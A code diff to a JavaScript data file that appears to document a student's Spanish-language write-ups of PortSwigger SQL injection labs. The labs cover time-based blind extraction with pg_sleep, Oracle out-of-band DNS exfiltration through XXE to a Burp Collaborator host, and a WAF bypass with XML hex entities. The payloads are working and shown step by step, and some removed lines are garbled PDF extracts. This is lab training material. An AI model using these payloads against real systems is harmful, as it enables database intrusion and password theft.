-        impact: "Peligro Inminente. Se requiere parchear.",
+        payload: "'; SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--",
+        description: "Extracción completa de contraseña carácter a carácter usando el tiempo de respuesta del servidor como único canal de comunicación.",
+        objective: "Extraer la contraseña del administrador carácter a carácter usando delays condicionales como oráculo, automatizado con Burp Intruder.",
+        analysis: "Se combina el delay condicional con SUBSTRING() para preguntar sobre cada carácter de la contraseña. Un delay de 10s = carácter correcto, respuesta inmediata = carácter incorrecto. Con 20 posiciones y [a-z0-9] son ~720 peticiones automatizables con Burp Intruder Cluster Bomb.",
+        impact: "Permite extraer datos completos de una base de datos incluso cuando la aplicación es completamente opaca en sus respuestas. La única defensa relevante es la eliminación de la vulnerabilidad en el código fuente, ya que el canal de timing siempre estará disponible.",
         steps: [
             {
-                title: "Identificación de la vulnerabilidad",
-                text: "Se procedió a identificar los parámetros vulnerables del tipo Blind (Time).",
-                code: "GET / HTTP/1.1"
+                title: "Determinación de longitud de contraseña",
+                text: "Se estructura el payload condicional para determinar la longitud. Si la longitud es mayor que N, el servidor espera 10 segundos. Se itera N hasta que la respuesta es inmediata.",
+                code: "'; SELECT CASE WHEN (LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--"
             },
             {
-                title: "Explotación del vector de ataque",
-                text: "Se estructuró un payload para extraer o eludir validaciones del backend.",
-                code: "PAYLOAD: x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--"
+                title: "Extracción carácter a carácter",
+                text: "Se construye el payload para evaluar cada posición. SUBSTRING(password,POS,1) extrae el carácter en la posición POS y lo compara con cada carácter del conjunto.",
+                code: "'; SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--"
             },
             {
-                title: "Evidencia de éxito",
-                text: "Se corrobora el éxito de la inyección en la respuesta o en el comportamiento del servidor.",
-                code: "HTTP/1.1 200 OK"
+                title: "Automatización con Burp Intruder",
+                text: "Se configura Burp Intruder en modo Cluster Bomb con dos payloads: posición (1-20) y carácter (a-z, 0-9). Se aplica un grep de tiempo de respuesta para identificar hits.",
+                code: "Intruder → Cluster Bomb → §POS§ + §CHAR§ → Filter by response time >9000ms"
             },
+            {
+                title: "Reconstrucción y acceso",
+                text: "Los caracteres con delay de 10s en cada posición forman la contraseña completa. Se inicia sesión con las credenciales obtenidas para resolver el laboratorio.",
+                code: "Contraseña reconstruida carácter por carácter → Login exitoso"
+            }
         ],
         images: [
-            "parcial2/act08_images/P16_img68.png",
-            "parcial2/act08_images/P16_img69.png",
-            "parcial2/act08_images/P17_img72.png",
             "parcial2/act08_images/P17_img73.png",
+            "parcial2/act08_images/P17_img74.png",
+            "parcial2/act08_images/P18_img77.png",
+            "parcial2/act08_images/P18_img78.png",
         ]
     },
     {
@@ -679,62 +584,38 @@ const labsData = [
         title: "Blind SQL injection with out-of-band interaction",
         type: "OAST",
         level: "Practitioner",
-        payload: "'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d\"1.0\"+encoding%3d\"UTF-8\"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+\"http%3a//BURP-COLLAB.net/\">+%25remote%3b]>'),'/l')+FROM+dual--",
-        description: "Bypass agresivo forzando resoluciones asíncronas de OAST y exfiltraciones no convencionales con XML XXE vía SQL.",
-        objective: "Explotar la vulnerabilidad de inyección SQL para forzar una  consulta DNS hacia el servidor de Burp Collaborator.. La comprensión de esta vulnerabilidad es vital para auditores de ciberseguridad ya que forma parte del TOP 10 de OWASP sobre inyección de fallos que exponen datos protegidos en arquitecturas empresariales modernas.",
-        analysis: "de la Vulnerabilidad: La aplicación utiliza una cookie de rastreo  (TrackingId) que es procesada por la base de datos de forma asíncrona. Debido a esto,  la aplicación no devuelve errores ni cambios en el contenido de la página (Blind). Sin  embargo, la base de datos (Oracle) permite el uso de funciones como  EXTRACTVALUE y xmltype que pueden ser manipuladas para realizar peticiones de  red externas (Out-of-band). Al inyectar un ataque de XXE dentro del SQLi, obligamos al  servidor a interactuar con un dominio externo controlado por el atacante.",
-        impact: "endada  ●​ Uso de Sentencias Preparadas (Prepared Statements): Es la defensa más  efectiva. Al usar consultas parametrizadas, la base de datos trata el contenido  de la cookie TrackingId como simple texto y no como código ejecutable.  ●​ Validación y Saneamiento de Entradas: Implementar filtros que verifiquen que  las cookies solo contengan caracteres alfanuméricos esperados, rechazando  cualquier petición que incluya palabras clave de SQL como SELECT o UNION.  ●​ Hardening de la Base de Datos: Configurar el motor de la base de datos  (Oracle) para que el usuario de la aplicación no tenga permisos de realizar  peticiones de red externas o ejecutar funciones XML innecesarias.. La remediación definitiva requiere la implementación universal de consultas parametrizadas y un enfoque estricto en el principio de mínimo privilegio en los permisos de la base de datos.",
+        payload: "' UNION SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % r SYSTEM \"http://BURP-COLLABORATOR/\">%r;]>'),'/l') FROM dual--",
+        description: "Exfiltración de datos mediante canal DNS out-of-band usando Burp Collaborator como receptor de las consultas DNS provocadas por la base de datos Oracle.",
+        objective: "Hacer que la base de datos Oracle realice una petición DNS hacia un servidor controlado por el atacante, confirmando la inyección OAST en un entorno sin respuesta HTTP visible.",
+        analysis: "OAST (Out-of-band Application Security Testing) usa canales de comunicación alternativos. Burp Collaborator es un servidor externo que registra peticiones DNS e HTTP. Al inyectar un payload que genera una entidad XML externa, Oracle intenta resolver el nombre DNS del atacante, confirmando la inyección sin necesidad de respuesta HTTP.",
+        impact: "Técnica altamente sigilosa que funciona incluso cuando la aplicación retorna respuestas completamente idénticas y no procesa errores de BD. El canal DNS suele evitar muchos firewalls que sí bloquean HTTP directo. Es la técnica más avanzada de blind SQLi.",
         steps: [
             {
-                title: "Paso 1",
-                text: "Intercepción: Abrir el navegador integrado de Burp Suite, acceder al laboratorio y capturar la petición GET inicial para enviarla al Repeater.",
-                code: ""
+                title: "Configurar Burp Collaborator",
+                text: "En Burp Suite se genera un subdominio único de Burp Collaborator que actuará como receptor de la petición DNS. Este subdominio será incluido en el payload XML.",
+                code: "Burp Suite → Collaborator → Copy to clipboard → xxxx.burpcollaborator.net"
             },
             {
-                title: "Paso 3",
-                text: "Se inyecta el siguiente código:",
-                code: "●​ Identificación del Vector: Se localiza la cookie TrackingId como el punto de"
+                title: "Construcción del payload XML con entidad externa",
+                text: "Se construye el payload que inyecta un XML con DOCTYPE que define una entidad externa apuntando al Collaborator. Oracle intentará resolver el DNS al procesar el XML.",
+                code: "' UNION SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % r SYSTEM \"http://xxxx.burpcollaborator.net/\">%r;]>'),'/l') FROM dual--"
             },
             {
-                title: "Paso 4",
-                text: "entrada. Al ser una base de datos Oracle, se selecciona un payload que combine SQLi con una entidad externa XML. Configuración del Atacante: En una auditoría profesional, se generaría un subdominio único en la pestaña de Burp Collaborator. Para efectos de este reporte técnico, se utiliza el marcador de posición BURP-COLLABORATOR-SUBDOMAIN.",
-                code: ""
+                title: "Envío con URL Encoding",
+                text: "Los caracteres especiales del XML (<, >, %) deben ser codificados en URL encoding para ser correctamente transmitidos en el parámetro HTTP. Se usa Ctrl+U en Burp Repeater.",
+                code: "URL Encode → %3c%3fxml... → Enviar desde Repeater"
             },
             {
-                title: "Paso 10",
-                text: "Se inyecta el siguiente código:",
-                code: "●​ Payload: TrackingId=x' UNION SELECT EXTRACTVALUE(xmltype('<?xml"
-            },
-            {
-                title: "Paso 11",
-                text: "version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://BURP-COLLABORATOR-SUBDOMAIN/\"> %remote;]>'),'/l') FROM dual-- Codificación: El payload se debe codificar en formato URL (URL Encoding) para asegurar que los caracteres especiales como < y > sean procesados correctamente por el servidor web. Ejecución: Se envía la petición modificada desde el Repeater. El servidor procesa la cookie, ejecuta la consulta SQL y, al intentar resolver el XML, la base de datos realiza una petición DNS al dominio del atacante. Resultado: En el servidor de Burp Collaborator se recibiría un \"DNS lookup\", lo cual confirma la existencia de la vulnerabilidad y la capacidad de ejecutar comandos que interactúan con sistemas externos. Para esta primera parte tenemos que ir a estas dos opciones, “Proxy” y despues a “intercept”. abrimos el browser y pegamos la url del lab encendemos la opcion intercept on Interceptamos algunas señales después de refrescar la página. En esta parte del panel izquierdo, básicamente hice el copy-paste del payload que",
-                code: ""
-            },
-            {
-                title: "Paso 29",
-                text: "Se inyecta el siguiente código:",
-                code: "preparé para la inyección. Lo pegué directamente en la cookie TrackingId porque es el"
-            },
-            {
-                title: "Paso 30",
-                text: "único campo que la aplicación rastrea. Como el payload tiene símbolos raros (brackets, comillas, etc.), seleccioné todo el texto y le di Ctrl + U. Eso hizo que Burp lo codifica automáticamente a formato URL, que es como el servidor lo necesita para entenderlo sin marcar error. Después, solo le di al botón de 'Send' para lanzar el ataque al servidor En la captura se observa que, tras inyectar el payload de interacción OAST en la cookie",
-                code: ""
-            },
-            {
-                title: "Paso 36",
-                text: "Se inyecta el siguiente código:",
-                code: "TrackingId y aplicar codificación URL, el servidor responde con un estado 200 OK. Esto"
-            },
-            {
-                title: "Paso 37",
-                text: "demuestra que la vulnerabilidad existe, ya que el sistema procesó una lógica de consulta no autorizada que involucra funciones de red de la base de datos (Oracle), confirmando la capacidad de provocar interacciones con servidores externos. Confirmación de x' UNION SELECT...: Se utiliza la comilla simple para romper la cadena original  de la consulta SQL y el comando UNION para inyectar nuestra propia sentencia  personalizada.  ●​ EXTRACTVALUE(): Es una función de Oracle que busca extraer datos de un  XML. Aquí se usa como \"disparador\" para forzar a la base de datos a realizar  una acción externa.  ●​ xmltype(): Crea un documento XML dentro de la base de datos que contiene la  instrucción de buscar una entidad en un servidor externo.  ●​ http://BURP-COLLABORATOR-SUBDOMAIN/: Es la dirección del atacante. Al  intentar resolver este dominio para cargar el XML, el servidor revela que es  vulnerable.  ●​ --: Estos guiones sirven para comentar el resto de la consulta original de la  aplicación, evitando que el servidor marque un error de sintaxis y asegurando  que nuestra inyección se ejecute limpiamente.",
-                code: ""
-            },
+                title: "Verificación en Collaborator",
+                text: "En la pestaña Collaborator de Burp Suite aparece un 'DNS Lookup' registrado desde la IP del servidor de la aplicación, confirmando que la inyección OAST fue exitosa.",
+                code: "Collaborator → DNS Lookup received from: x.x.x.x (servidor objetivo)"
+            }
         ],
         images: [
-            "parcial2/act08_images/P17_img72.png",
-            "parcial2/act08_images/P17_img73.png",
-            "parcial2/act08_images/P19_img78.png",
+            "parcial2/act08_images/P18_img77.png",
+            "parcial2/act08_images/P18_img78.png",
+            "parcial2/act08_images/P19_img81.png",
+            "parcial2/act08_images/P19_img82.png",
         ]
     },
     {
@@ -742,32 +623,37 @@ const labsData = [
         title: "Blind SQL injection with out-of-band data exfiltration",
         type: "OAST",
         level: "Practitioner",
-        payload: "'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d\"1.0\"+encoding%3d\"UTF-8\"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+\"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLAB.net/\">+%25remote%3b]>'),'/l')+FROM+dual--",
-        description: "Colusión DNS maliciosa avanzada filtrando data vía resolución TLD de DNS CNAME.",
-        objective: "El objetivo principal es explotar una vulnerabilidad de inyección SQL \"ciega\" para  extraer (exfiltrar) información sensible —específicamente la contraseña del usuario  administrator— de la tabla users. Dado que la aplicación no refleja datos ni errores en  la interfaz web, se debe forzar a la base de datos a realizar una petición externa que  lleve consigo el dato robado.",
-        analysis: "de la Vulnerabilidad  La vulnerabilidad reside en la cookie de rastreo TrackingId, la cual es procesada por la  base de datos para realizar consultas analíticas de forma asíncrona. Al ser una base de  datos Oracle, permite el uso de funciones XML para interactuar con sistemas externos.  La técnica aplicada es OAST (Out-of-band Application Security Testing). Se utiliza la  función EXTRACTVALUE junto con xmltype para generar una petición DNS maliciosa.  La clave de este ejercicio es la concatenación de datos: se utiliza el operador || de  Oracle para unir el resultado de una subconsulta SQL (la contraseña del administrador)  con un nombre de dominio controlado por el atacante.",
-        impact: "Peligro Inminente. Se requiere parchear.",
+        payload: "' UNION SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % r SYSTEM \"http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR/\">%r;]>'),'/l') FROM dual--",
+        description: "Exfiltración completa de contraseña embebida como subdominio DNS en una petición OAST hacia Burp Collaborator.",
+        objective: "Extraer la contraseña del administrador embebiéndola en la petición DNS enviada al servidor Collaborator del atacante, obteniendo el dato completo de una sola petición.",
+        analysis: "Extensión del laboratorio anterior: en lugar de solo confirmar la interacción, se embebe la contraseña como parte del subdominio DNS. La concatenación incluye el resultado de la subconsulta SQL directamente en la URL del sistema de entidades externas: 'password_value.collaborator.net'. El servidor DNS del atacante recibe el dato.",
+        impact: "Exfiltración de datos completa en una sola petición, completamente fuera de banda. Prácticamente invisible para sistemas de detección que monitorean solo tráfico HTTP. La única forma de detectarlo es con análisis de tráfico DNS saliente del servidor de base de datos.",
         steps: [
             {
-                title: "Identificación de la vulnerabilidad",
-                text: "Se procedió a identificar los parámetros vulnerables del tipo OAST.",
-                code: "GET / HTTP/1.1"
+                title: "Construcción del payload con datos embebidos",
+                text: "Se modifica el payload OAST anterior para incluir la subconsulta SQL dentro de la URL del sistema externo. El resultado de la query se convierte en parte del nombre de dominio DNS.",
+                code: "'http://'||(SELECT password FROM users WHERE username='administrator')||'.xxxx.burpcollaborator.net/'"
             },
             {
-                title: "Explotación del vector de ataque",
-                text: "Se estructuró un payload para extraer o eludir validaciones del backend.",
-                code: "PAYLOAD: '+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d\"1.0\"+encoding%3d\"UTF-8\"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+\"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLAB.net/\">+%25remote%3b]>'),'/l')+FROM+dual--"
+                title: "Payload completo con EXTRACTVALUE",
+                text: "El payload XML completo combina el EXTRACTVALUE de Oracle con la entidad externa que contiene la contraseña concatenada como subdominio.",
+                code: "' UNION SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % r SYSTEM \"http://'||(SELECT password FROM users WHERE username='administrator')||'.xxxx.burpcollaborator.net/\">%r;]>'),'/l') FROM dual--"
             },
             {
-                title: "Evidencia de éxito",
-                text: "Se corrobora el éxito de la inyección en la respuesta o en el comportamiento del servidor.",
-                code: "HTTP/1.1 200 OK"
+                title: "Envío y captura",
+                text: "Se envía la petición desde Burp Repeater con el payload URL-encoded. En la pestaña Collaborator se registrará la petición DNS con la contraseña como subdominio.",
+                code: "URL Encode → Enviar → Verificar Collaborator"
             },
+            {
+                title: "Lectura del dato en Collaborator",
+                text: "El panel de Collaborator muestra el DNS Lookup recibido. El subdominio del nombre de host consultado contiene la contraseña del administrador en texto plano.",
+                code: "Lookup: password_value.xxxx.burpcollaborator.net → Contraseña extraída"
+            }
         ],
         images: [
-            "parcial2/act08_images/P19_img78.png",
-            "parcial2/act08_images/P20_img81.png",
-            "parcial2/act08_images/P20_img82.png",
+            "parcial2/act08_images/P19_img81.png",
+            "parcial2/act08_images/P19_img82.png",
+            "parcial2/act08_images/P20_img85.png",
         ]
     },
     {
@@ -775,27 +661,32 @@ const labsData = [
         title: "SQL injection with filter bypass via XML encoding",
         type: "Filter Bypass",
         level: "Practitioner",
-        payload: "&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;+",
-        description: "Evasión y ofuscación pura contra WAF empresariales abusando de decodificadores internos de XML o JSON.",
-        objective: "El objetivo consiste en vulnerar la consulta SQL que procesa el stock de productos para  extraer las credenciales del usuario administrator. Para lograrlo, es necesario evadir la  seguridad del WAF y realizar una inyección basada en UNION que concatene el  nombre de usuario y la contraseña de la tabla users en una sola columna de respuesta.",
-        analysis: "de la Vulnerabilidad  La vulnerabilidad se localiza en la etiqueta <storeId> del documento XML enviado al  servidor. El servidor toma el valor numérico de esta etiqueta y lo inserta directamente  en una consulta SQL sin la debida sanitización.  Para evadir el WAF, aprovechamos una característica del procesamiento de  documentos XML: el XML Parser. Cuando el servidor recibe el XML, primero decodifica  cualquier entidad presente (como caracteres en formato hexadecimal) antes de pasar  el valor final a la lógica de la aplicación y a la base de datos. Al enviar las palabras  clave del ataque codificadas (por ejemplo, usando &#x53; en lugar de S), el WAF ve  una cadena de texto inofensiva y permite el paso de la petición, pero la base de datos  acaba ejecutando el comando SQL completo una vez decodificado.",
-        impact: "Peligro Inminente. Se requiere parchear.",
+        payload: "&#x31;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;",
+        description: "Evasión de WAF codificando el payload UNION SELECT en entidades hexadecimales XML para que el firewall no reconozca el SQL mientras la base de datos sí lo ejecuta.",
+        objective: "Bypassear el WAF (Web Application Firewall) que bloquea keywords SQL en el body de peticiones POST codificando el payload completo en entidades XML hexadecimales.",
+        analysis: "La aplicación usa un WAF que bloquea peticiones con keywords SQL (UNION, SELECT, etc.) en el cuerpo XML del POST. Sin embargo, el WAF no decodifica entidades XML antes de aplicar el filtro. Al codificar el payload completo como entidades hex (&#xNN;), el WAF no lo reconoce como SQL, pero el parser XML del servidor sí lo decodifica antes de pasarlo a la base de datos.",
+        impact: "Demuestra que los filtros de seguridad son ineficaces si no realizan decodificación recursiva de los datos antes de aplicar reglas. Un WAF bypasseado en producción es peor que no tener WAF, ya que da falsa sensación de seguridad.",
         steps: [
             {
-                title: "Identificación de la vulnerabilidad",
-                text: "Se procedió a identificar los parámetros vulnerables del tipo Filter Bypass.",
-                code: "GET / HTTP/1.1"
+                title: "Identificación del endpoint vulnerable y el WAF",
+                text: "La aplicación tiene un endpoint POST /api/stock que acepta XML. Al intentar inyectar SQL directo en el campo storeId, el WAF retorna HTTP 403 Forbidden.",
+                code: "<storeId>1 UNION SELECT NULL--</storeId>  →  HTTP 403 Forbidden"
             },
             {
-                title: "Explotación del vector de ataque",
-                text: "Se estructuró un payload para extraer o eludir validaciones del backend.",
-                code: "PAYLOAD: &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;+"
+                title: "Codificación del payload con Hackvertor",
+                text: "En Burp Suite se instala la extensión Hackvertor. Se selecciona el payload SQL y se aplica la codificación hex_entities para convertir cada carácter a su entidad XML hexadecimal.",
+                code: "UNION SELECT password FROM users  →  &#x55;&#x4e;&#x49;&#x4f;&#x4e;..."
             },
             {
-                title: "Evidencia de éxito",
-                text: "Se corrobora el éxito de la inyección en la respuesta o en el comportamiento del servidor.",
-                code: "HTTP/1.1 200 OK"
+                title: "Envío del payload codificado",
+                text: "El body XML contiene el payload completamente codificado. El WAF solo ve caracteres XML aparentemente inocentes. El servidor decodifica las entidades y ejecuta el SQL.",
+                code: "<storeId>&#x31;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;username,password&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;users</storeId>"
             },
+            {
+                title: "Extracción y acceso",
+                text: "El servidor retorna HTTP 200 con el resultado de la consulta SQL incluyendo las credenciales del administrador. Se inicia sesión y el laboratorio queda resuelto.",
+                code: "HTTP/1.1 200 OK → administrator : s3cr3tpassword → Login exitoso"
+            }
         ],
         images: [
             "parcial2/act08_images/P19_img78.png",
